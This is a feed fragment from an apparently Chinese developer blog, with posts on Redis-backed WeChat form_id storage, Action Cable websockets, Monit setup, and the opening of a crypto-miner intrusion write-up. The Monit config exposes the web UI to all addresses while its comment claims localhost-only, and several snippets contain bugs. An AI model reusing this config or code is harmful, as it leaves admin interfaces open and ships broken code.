+<p>使用：从中取有效的 <code class="language-plaintext highlighter-rouge">form_id</code>, 用完就删除该记录并且通过某种机制清理无效的 <code class="language-plaintext highlighter-rouge">form_id</code></p>
+
+<h3 id="方案二-1">方案二：</h3>
+<p>存储：存在 <code class="language-plaintext highlighter-rouge">redis</code> 里面，使用 <code class="language-plaintext highlighter-rouge">redis</code> 的自动过期机制</p>
+
+<p>使用：直接从<code class="language-plaintext highlighter-rouge">redis</code> 里面取</p>
+
+<h2 id="分析">分析</h2>
+<p>方案1：需要建表来存储。而且需要处理过期 <code class="language-plaintext highlighter-rouge">form_id</code>，并且需要做到用完之后销毁。</p>
+
+<p>方案2：使用字段的方式，并且用完之后需要去除使用过的 <code class="language-plaintext highlighter-rouge">form_id</code>, 更新字段。</p>
+
+<p>方案3：使用 <code class="language-plaintext highlighter-rouge">redis</code> 不影响现有的表结构，可以跟业务解耦；若使用用户的<code class="language-plaintext highlighter-rouge">id</code> 作为键，那 <code class="language-plaintext highlighter-rouge">form_ids</code> 就是一个列表，<code class="language-plaintext highlighter-rouge">redis</code> 只能队一个键设置过期，并不能对键中的某个值设置过期。</p>
+
+<p>若是能解决 <code class="language-plaintext highlighter-rouge">redis</code> 过期的问题，那方案3就是一个最合适的方案，而且可以做成一个 <code class="language-plaintext highlighter-rouge">form_id</code> 收集服务，容易在项目间移植。</p>
+
+<h2 id="最终的思路与实现方案">最终的思路与实现方案</h2>
+
+<h3 id="思路">思路</h3>
+
+<p>使用 <code class="language-plaintext highlighter-rouge">redis</code> 有序集合 <code class="language-plaintext highlighter-rouge">sorted Set</code>。每个有序集合 的成员都关联着一个 <code class="language-plaintext highlighter-rouge">score</code>，这个 <code class="language-plaintext highlighter-rouge">score</code> 用于把有序集合中的成员按最低到最高排列。如果我们将 <code class="language-plaintext highlighter-rouge">score</code> 设置成时间戳，让后通过 <code class="language-plaintext highlighter-rouge">zremrangebyscore</code> 来删除过期数据。这样就通过曲线救国的方式解决方案3的问题。</p>
+
+<h3 id="实现代码">实现代码</h3>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">module</span> <span class="nn">Wechat</span>
+  <span class="k">class</span> <span class="nc">FormId</span>
+
+    <span class="vc">@@redis_connection</span> <span class="o">=</span> <span class="no">Redis</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="ss">host: </span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">,</span> <span class="ss">port: </span><span class="mi">6379</span><span class="p">,</span> <span class="ss">db: </span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="vc">@@redis</span> <span class="o">=</span> <span class="no">Redis</span><span class="o">::</span><span class="no">Namespace</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"wechat_form_id"</span><span class="p">,</span> <span class="ss">:redis</span> <span class="o">=&gt;</span> <span class="vi">@redis_connection</span><span class="p">)</span>
+
+
+    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">save</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">form_id</span><span class="p">)</span>
+      <span class="vc">@@redis</span><span class="p">.</span><span class="nf">zadd</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="no">Time</span><span class="p">.</span><span class="nf">current</span><span class="p">.</span><span class="nf">to_i</span><span class="p">,</span> <span class="n">form_id</span><span class="p">)</span>
+    <span class="k">end</span>
+
+    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">get_one</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
+      <span class="vc">@@redis</span><span class="p">.</span><span class="nf">zrangebyscore</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">seven_days_ago</span><span class="p">,</span> <span class="no">Time</span><span class="p">.</span><span class="nf">current</span><span class="p">.</span><span class="nf">to_i</span><span class="p">,</span> <span class="ss">limit: </span><span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">])</span>
+    <span class="k">end</span>
+
+    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">get_all</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
+      <span class="vc">@@redis</span><span class="p">.</span><span class="nf">zrangebyscore</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">seven_days_ago</span><span class="p">,</span> <span class="no">Time</span><span class="p">.</span><span class="nf">current</span><span class="p">.</span><span class="nf">to_i</span><span class="p">)</span>
+    <span class="k">end</span>
+
+    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">delete</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">form_id</span><span class="p">)</span>
+      <span class="vc">@@redis</span><span class="p">.</span><span class="nf">zrem</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">form_id</span><span class="p">)</span>
+    <span class="k">end</span>
+
+    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">pop</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
+      <span class="n">form_id</span> <span class="o">=</span> <span class="n">get_one</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span><span class="o">&amp;</span><span class="p">.</span><span class="nf">first</span>
+      <span class="n">delete</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">form_id</span><span class="p">)</span> <span class="k">if</span> <span class="n">form_id</span>
+      <span class="n">form_id</span>
+    <span class="k">end</span>
+
+    <span class="c1"># form_id 有效期为7天</span>
+    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">delete_expire</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
+      <span class="vc">@@redis</span><span class="p">.</span><span class="nf">zremrangebyscore</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">seven_days_ago</span><span class="p">)</span>
+    <span class="k">end</span>
+
+    <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">seven_days_ago</span>
+      <span class="p">(</span><span class="no">Time</span><span class="p">.</span><span class="nf">current</span> <span class="o">-</span> <span class="mi">7</span><span class="p">.</span><span class="nf">days</span><span class="p">).</span><span class="nf">to_i</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+</code></pre></div></div>
+
+<p>保存 <code class="language-plaintext highlighter-rouge">form_id</code>: <code class="language-plaintext highlighter-rouge">Wechat::FormId.save(${user_id}, ${form_id})</code></p>
+
+<p>取出 <code class="language-plaintext highlighter-rouge">form_id</code>: 当需要使用 <code class="language-plaintext highlighter-rouge">form_id</code> 来发模板消息的时候，调用 <code class="language-plaintext highlighter-rouge">Wechat::FormId.pop(${form_id})</code>即可</p>
+
+<p>处理过期：使用定时任务跑 <code class="language-plaintext highlighter-rouge">Wechat::FormId.delete_expire(${user_id})</code></p>]]></content><author><name>xifengzhu</name></author><summary type="html"><![CDATA[当用户在小程序内发生过提交表单行为且该表单声明为要发模板消息的，开发者需要向用户提供服务时，可允许开发者向用户在7天内推送有限条数的模板消息（1次提交表单可下发1条，多次提交下发条数独立，相互不影响）]]></summary></entry><entry><title type="html">微信小程序用 web socket 和 rails 的 Action Cable 通讯</title><link href="xifengzhu.github.com/2018/05/06/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%94%A8-web-socket-%E5%92%8C-rails-%E7%9A%84-action-cable-%E9%80%9A%E8%AE%AF.html" rel="alternate" type="text/html" title="微信小程序用 web socket 和 rails 的 Action Cable 通讯" /><published>2018-05-06T00:00:00+00:00</published><updated>2018-05-06T00:00:00+00:00</updated><id>xifengzhu.github.com/2018/05/06/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%94%A8-web-socket-%E5%92%8C-rails-%E7%9A%84-action-cable-%E9%80%9A%E8%AE%AF</id><content type="html" xml:base="xifengzhu.github.com/2018/05/06/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%94%A8-web-socket-%E5%92%8C-rails-%E7%9A%84-action-cable-%E9%80%9A%E8%AE%AF.html"><![CDATA[<p>最近在做一个商品竞拍的需求，考虑到需要使用微信小程序的 web socket跟rails 的 Action Cable。做了以下尝试，将踩坑的过程记录下来。</p>
+
+<h2 id="建立-rails-action-cable-服务端">建立 rails Action Cable 服务端</h2>
+
+<h3 id="链接设置">链接设置</h3>
+<p>由于小程序端的请求是无状态的，无法发送 <code class="language-plaintext highlighter-rouge">cookie</code> 来鉴权， 所有在请求的时候需要带上一个特殊的 <code class="language-plaintext highlighter-rouge">headers['Authorization']</code>， 后端采用 <code class="language-plaintext highlighter-rouge">jwt</code> 进行鉴权。 具体代码如下：</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">module</span> <span class="nn">ApplicationCable</span>
+  <span class="k">class</span> <span class="nc">Connection</span> <span class="o">&lt;</span> <span class="no">ActionCable</span><span class="o">::</span><span class="no">Connection</span><span class="o">::</span><span class="no">Base</span>
+    <span class="n">identified_by</span> <span class="ss">:current_user</span>
+
+    <span class="k">def</span> <span class="nf">connect</span>
+      <span class="nb">self</span><span class="p">.</span><span class="nf">current_user</span> <span class="o">=</span> <span class="n">find_verified_user</span>
+    <span class="k">end</span>
+
+    <span class="kp">private</span>
+    <span class="k">def</span> <span class="nf">find_verified_user</span>
+      <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Authorization'</span><span class="p">]</span>
+      <span class="k">if</span> <span class="n">token</span>
+        <span class="c1"># jwt authentication</span>
+      <span class="k">else</span>
+        <span class="n">reject_unauthorized_connection</span>
+      <span class="k">end</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<h3 id="设置频道与接收数据处理逻辑">设置频道与接收数据处理逻辑</h3>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AuctionChannel</span> <span class="o">&lt;</span> <span class="no">ApplicationCable</span><span class="o">::</span><span class="no">Channel</span>
+  <span class="c1"># 当用户成为此频道的订阅者时调用</span>
+  <span class="k">def</span> <span class="nf">subscribed</span>
+    <span class="n">stream_from</span> <span class="s2">"auction_channel_</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:id</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">unsubscribed</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">receive</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="c1"># 接收收据处理逻辑</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<h2 id="微信端链接">微信端链接</h2>
+
+<p>建立链接是需要注意的是在 <code class="language-plaintext highlighter-rouge">header</code> 中加上用来做身份鉴定的 <code class="language-plaintext highlighter-rouge">Authorization</code></p>
+
+<p>微信端向服务端发送消息需要将 <code class="language-plaintext highlighter-rouge">command</code> 包装在 <code class="language-plaintext highlighter-rouge">data</code> 参数中，可使用的 <code class="language-plaintext highlighter-rouge">command</code> 有 <code class="language-plaintext highlighter-rouge">[subscribe, message]</code>, 一个用来订阅频道， 一个用来发送消息。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">initSocket</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="err">#</span> <span class="nx">建立socket链接</span>
+  <span class="nx">wx</span><span class="p">.</span><span class="nx">connectSocket</span><span class="p">({</span>
+    <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ws://localhost:3000/cable</span><span class="dl">"</span><span class="p">,</span>
+    <span class="na">header</span><span class="p">:{</span>
+      <span class="dl">'</span><span class="s1">content-type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span>
+      <span class="dl">'</span><span class="s1">Authorization</span><span class="dl">'</span><span class="p">:</span> <span class="nx">$</span><span class="p">{</span><span class="nx">current_user</span><span class="p">.</span><span class="nx">token</span><span class="p">}</span>
+    <span class="p">},</span>
+    <span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span>
+  <span class="p">});</span>
+
+  <span class="err">#</span> <span class="nx">Rails</span> <span class="nx">的</span> <span class="nx">js</span> <span class="nx">代码对</span> <span class="nx">websocket</span> <span class="nx">进行了一些封装</span><span class="err">，</span><span class="nx">直接用</span> <span class="nx">socket</span> <span class="nx">连到</span> <span class="na">ws</span><span class="p">:</span><span class="c1">//localhost:3000/cable 是收不到消息的，要客户端发送一个 "subscribe" 到 websocket 才可以</span>
+  <span class="nx">wx</span><span class="p">.</span><span class="nx">onSocketOpen</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="na">channel</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AuctionChannel</span><span class="dl">"</span><span class="p">,</span> <span class="na">id</span><span class="p">:</span> <span class="nx">$</span><span class="p">{</span><span class="nx">id</span><span class="p">}});</span>
+    <span class="nx">wx</span><span class="p">.</span><span class="nx">sendSocketMessage</span><span class="p">({</span>
+      <span class="na">data</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="na">command</span><span class="p">:</span> <span class="dl">"</span><span class="s2">subscribe</span><span class="dl">"</span><span class="p">,</span> <span class="na">identifier</span><span class="p">:</span> <span class="na">id</span><span class="p">:</span> <span class="nx">$</span><span class="p">{</span><span class="nx">id</span><span class="p">}}),</span>
+    <span class="p">})</span>
+  <span class="p">});</span>
+
+  <span class="err">#</span> <span class="nx">客户端发送信息到服务端</span>
+  <span class="nx">wx</span><span class="p">.</span><span class="nx">sendSocketMessage</span><span class="p">({</span>
+    <span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="na">channel</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AuctionChannel</span><span class="dl">"</span><span class="p">,</span> <span class="na">id</span><span class="p">:</span> <span class="nx">$</span><span class="p">{</span><span class="nx">id</span><span class="p">}});</span>
+    <span class="nl">data</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+      <span class="na">command</span><span class="p">:</span> <span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">data</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="na">test</span><span class="p">:</span> <span class="dl">'</span><span class="s1">ddd</span><span class="dl">'</span><span class="p">}),</span>
+      <span class="na">identifier</span><span class="p">:</span> <span class="nx">id</span>
+    <span class="p">})</span>
+  <span class="p">})</span>
+
+  <span class="err">#</span> <span class="nx">接受到服务端推送信息处理逻辑</span>
+  <span class="nx">wx</span><span class="p">.</span><span class="nx">onSocketMessage</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">identifier</span> <span class="o">&amp;&amp;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">message</span><span class="p">){</span>
+      <span class="kd">const</span> <span class="nx">auctionRecord</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">auctionRecord</span><span class="p">)</span>
+    <span class="p">}</span>
+  <span class="p">});</span>
+
+  <span class="nx">wx</span><span class="p">.</span><span class="nx">onSocketError</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">res</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">WebSocket连接打开失败，请检查！</span><span class="dl">'</span><span class="p">)</span>
+  <span class="p">});</span>
+
+  <span class="nx">wx</span><span class="p">.</span><span class="nx">onSocketClose</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">WebSocket 已关闭！</span><span class="dl">'</span><span class="p">)</span>
+  <span class="p">})</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="参考">参考</h2>
+<ul>
+  <li><a href="https://ruby-china.github.io/rails-guides/action_cable_overview.html">Action Cable 概览</a></li>
+  <li><a href="https://developers.weixin.qq.com/miniprogram/dev/api/network-socket.html">小程序 WebSocket</a></li>
+</ul>]]></content><author><name>xifengzhu</name></author><summary type="html"><![CDATA[最近在做一个商品竞拍的需求，考虑到需要使用微信小程序的 web socket跟rails 的 Action Cable。做了以下尝试，将踩坑的过程记录下来。]]></summary></entry><entry><title type="html">使用Monit 监听 Unicorn 进程</title><link href="xifengzhu.github.com/2017/11/17/%E4%BD%BF%E7%94%A8monit-%E7%9B%91%E5%90%AC-unicorn-%E8%BF%9B%E7%A8%8B.html" rel="alternate" type="text/html" title="使用Monit 监听 Unicorn 进程" /><published>2017-11-17T00:00:00+00:00</published><updated>2017-11-17T00:00:00+00:00</updated><id>xifengzhu.github.com/2017/11/17/%E4%BD%BF%E7%94%A8monit-%E7%9B%91%E5%90%AC-unicorn-%E8%BF%9B%E7%A8%8B</id><content type="html" xml:base="xifengzhu.github.com/2017/11/17/%E4%BD%BF%E7%94%A8monit-%E7%9B%91%E5%90%AC-unicorn-%E8%BF%9B%E7%A8%8B.html"><![CDATA[<p>Monit 可以自动监视和管理服务器程序, 以确保它们不仅始终保持联机状态, 而且文件大小、校验和或权限始终正确。此外, 播还提供了一个基本的 web 界面, 通过它可以设置所有进程。</p>
+
+<h3 id="安装-monit">安装 Monit</h3>
+
+<p>安装 <code class="language-plaintext highlighter-rouge">monit</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>monit
+</code></pre></div></div>
+
+<p>通过命令 <code class="language-plaintext highlighter-rouge">sudo monit</code> 启动 <code class="language-plaintext highlighter-rouge">monit</code></p>
+
+<p>查看下状态 <code class="language-plaintext highlighter-rouge">monit status</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The Monit daemon 5.3.2 <span class="nb">uptime</span>: 1h 25m
+
+System <span class="s1">'myhost.mydomain.tld'</span>
+  status                            Running
+  monitoring status                 Monitored
+  load average                      <span class="o">[</span>0.03] <span class="o">[</span>0.14] <span class="o">[</span>0.20]
+  cpu                               3.5%us 5.9%sy 0.0%wa
+  memory usage                      26100 kB <span class="o">[</span>10.4%]
+  swap usage                        0 kB <span class="o">[</span>0.0%]
+  data collected                    Thu, 30 Aug 2012 18:35:00
+</code></pre></div></div>
+
+<p>修改配置文件 <code class="language-plaintext highlighter-rouge">/etc/monit/monitrc</code>，打开web界面访问</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>httpd port 2812 and
+  use address <span class="k">${</span><span class="nv">IP</span><span class="k">}</span> <span class="c"># only accept connection from localhost</span>
+  allow localhost   <span class="c"># allow localhost to connect to the server and</span>
+  allow 0.0.0.0/0.0.0.0
+  allow user:password read-only <span class="c"># require user 'user' with password 'password'</span>
+</code></pre></div></div>
+
+<p>配置完成之后重新加载一下 <code class="language-plaintext highlighter-rouge">monit reload</code></p>
+
+<h3 id="添加监控进程">添加监控进程</h3>
+
+<p>在 <code class="language-plaintext highlighter-rouge">/etc/monit/conf-available</code> 目录下添加一个文件例如： <code class="language-plaintext highlighter-rouge">www.example.com</code></p>
+
+<p>内容如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>check process example_unicorn
+  with pidfile /var/www/www.example.com/current/tmp/pids/unicorn.pid
+  start program = "/etc/init.d/example_unicorn start" as uid root and gid root
+  stop program = "/etc/init.d/example_unicorn stop" as uid root and gid root
+</code></pre></div></div>
+
+<p>如何制作 <code class="language-plaintext highlighter-rouge">example_unicorn</code> service 请见 <a href="/2017/08/26/unicorn-auto-start-after-server-boot.html">Unicorn auto start after server boot</a></p>
+
+<p>并且新建一个软连接：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /etc/monit/conf-available/www.example.com /etc/monit/conf-enabled/www.example.com
+</code></pre></div></div>
+
+<p>检查下语法 <code class="language-plaintext highlighter-rouge">monit t</code>, 重新加载下 <code class="language-plaintext highlighter-rouge">monit reload</code> 即可。</p>
+
+<p>访问 <code class="language-plaintext highlighter-rouge">http://${ip}:2812 </code>界面截图如下：</p>
+
+<p><img src="https://user-images.githubusercontent.com/4188624/32927828-7bca224c-cb14-11e7-8519-243bd1abddc5.png" alt="image" /></p>
+
+<h3 id="参考">参考</h3>
+<ul>
+  <li><a href="https://mmonit.com/monit/">Monit 官网</a></li>
+  <li><a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-monit">How To Install and Configure Monit</a></li>
+  <li><a href="http://xifengzhu.github.io/2017/08/26/unicorn-auto-start-after-server-boot.html">Unicorn auto start after server boot</a></li>
+</ul>]]></content><author><name>xifengzhu</name></author><summary type="html"><![CDATA[Monit 可以自动监视和管理服务器程序, 以确保它们不仅始终保持联机状态, 而且文件大小、校验和或权限始终正确。此外, 播还提供了一个基本的 web 界面, 通过它可以设置所有进程。]]></summary></entry><entry><title type="html">服务器被植入挖矿程序</title><link href="xifengzhu.github.com/2017/11/07/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%A4%8D%E5%85%A5%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F.html" rel="alternate" type="text/html" title="服务器被植入挖矿程序" /><published>2017-11-07T00:00:00+00:00</published><updated>2017-11-07T00:00:00+00:00</updated><id>xifengzhu.github.com/2017/11/07/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%A4%8D%E5%85%A5%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F</id><content type="html" xml:base="xifengzhu.github.com/2017/11/07/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%A4%8D%E5%85%A5%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F.html"><![CDATA[<p>服务器被植入挖矿程序</p>
+
+<h2 id="事件简介">事件简介</h2>
+<p>服务器遭遇入侵，入侵者通过 Redis 未授权访问缺陷，植入挖矿程序</p>
+
+<h2 id="起因">起因</h2>
+<p>Redis 未授权访问缺陷可轻易导致系统被黑</p>
+
+<h2 id="经过">经过</h2>
+
+<p>执行 <code class="language-plaintext highlighter-rouge">htop</code> 发现异常进程</p>
+
+<p><img src="https://user-images.githubusercontent.com/4188624/32473483-512966e0-c32d-11e7-842e-f76b7b0558c8.png" alt="1__deployer_VM-117-230-ubuntu___var_lib_postgresql_9_3_main__ssh_.png" /></p>
+
+<p>查看异常进程信息 <code class="language-plaintext highlighter-rouge">sudo ls -al /proc/25461</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dr-xr-xr-x   9 deployer postgres 0 Nov  6 13:15 .
+dr-xr-xr-x 193 root     root     0 Aug 19 12:05 ..
+dr-xr-xr-x   2 deployer postgres 0 Nov  6 13:15 attr
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 autogroup
+-r--------   1 deployer postgres 0 Nov  6 13:15 auxv
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cgroup
+--w-------   1 deployer postgres 0 Nov  6 13:15 clear_refs
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cmdline
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 comm
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 coredump_filter
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cpuset
+lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 cwd -&gt; /
+-r--------   1 deployer postgres 0 Nov  6 13:15 environ
+lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 exe -&gt; /var/lib/postgresql/9.3/main/x3776026004
+dr-x------   2 deployer postgres 0 Nov  6 13:15 fd
+dr-x------   2 deployer postgres 0 Nov  6 13:15 fdinfo
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 gid_map
+-r--------   1 deployer postgres 0 Nov  6 13:15 io
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 latency
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 limits
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 loginuid
+dr-x------   2 deployer postgres 0 Nov  6 13:15 map_files
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 maps
+-rw-------   1 deployer postgres 0 Nov  6 13:15 mem
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 mountinfo
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 mounts
+-r--------   1 deployer postgres 0 Nov  6 13:15 mountstats
+dr-xr-xr-x   5 deployer postgres 0 Nov  6 13:15 net
+dr-x--x--x   2 deployer postgres 0 Nov  6 13:15 ns
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 numa_maps
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 oom_adj
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 oom_score
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 oom_score_adj
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 pagemap
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 personality
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 projid_map
+lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 root -&gt; /
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 sched
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 schedstat
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 sessionid
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 smaps
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 stack
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 stat
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 statm
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 status
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 syscall
+dr-xr-xr-x  13 deployer postgres 0 Nov  6 13:15 task
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 timers
+-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 uid_map
+-r--r--r--   1 deployer postgres 0 Nov  6 13:15 wchan
+</code></pre></div></div>
+
+<p>发现异常进程<code class="language-plaintext highlighter-rouge">exe -&gt; /var/lib/postgresql/9.3/main/x3776026004</code> 查看 pg 目录 <code class="language-plaintext highlighter-rouge">/var/lib/postgresql/9.3/main</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drwx------ 15 deployer postgres    4096 Oct 23 04:33 ./
+drwxr-xr-x  3 deployer postgres    4096 Aug 16  2016 ../
+drwx------  6 deployer postgres    4096 Aug 30 17:53 base/
+drwx------  2 deployer postgres    4096 Sep  5 16:08 global/
+drwx------  2 deployer postgres    4096 Aug 16  2016 pg_clog/
+drwx------  4 deployer postgres    4096 Aug 16  2016 pg_multixact/
+drwx------  2 deployer postgres    4096 Aug 30 18:13 pg_notify/
+drwx------  2 deployer postgres    4096 Aug 16  2016 pg_serial/
+drwx------  2 deployer postgres    4096 Aug 16  2016 pg_snapshots/
+drwx------  2 deployer postgres    4096 Aug 30 18:13 pg_stat/
+drwx------  2 deployer postgres    4096 Nov  6 12:19 pg_stat_tmp/
+drwx------  2 deployer postgres    4096 Aug 16  2016 pg_subtrans/
+drwx------  2 deployer postgres    4096 Aug 16  2016 pg_tblspc/
+drwx------  2 deployer postgres    4096 Aug 16  2016 pg_twophase/
+<span class="nt">-rw-------</span>  1 deployer postgres       4 Aug 16  2016 PG_VERSION
+drwx------  3 deployer postgres    4096 Aug 16  2016 pg_xlog/
+<span class="nt">-rw-------</span>  1 deployer postgres     133 Aug 30 18:13 postmaster.opts
+<span class="nt">-rw-------</span>  1 deployer postgres      93 Aug 30 18:13 postmaster.pid
+<span class="nt">-rwxrwxrwx</span>  1 deployer postgres   14480 Oct 13 10:06 ps3767604655<span class="k">*</span>
+<span class="nt">-rw-r--r--</span>  1 deployer postgres   15360 Oct 12 03:58 vcredist_x64_1130.dll
+<span class="nt">-rw-r--r--</span>  1 deployer postgres  100352 Oct 13 04:52 vcredist_x64_2191.dll
+<span class="nt">-rw-r--r--</span>  1 deployer postgres   15360 Oct 12 08:50 vcredist_x64_5569.dll
+<span class="nt">-rw-r--r--</span>  1 deployer postgres  100352 Oct 23 04:33 vcredist_x64_6375.dll
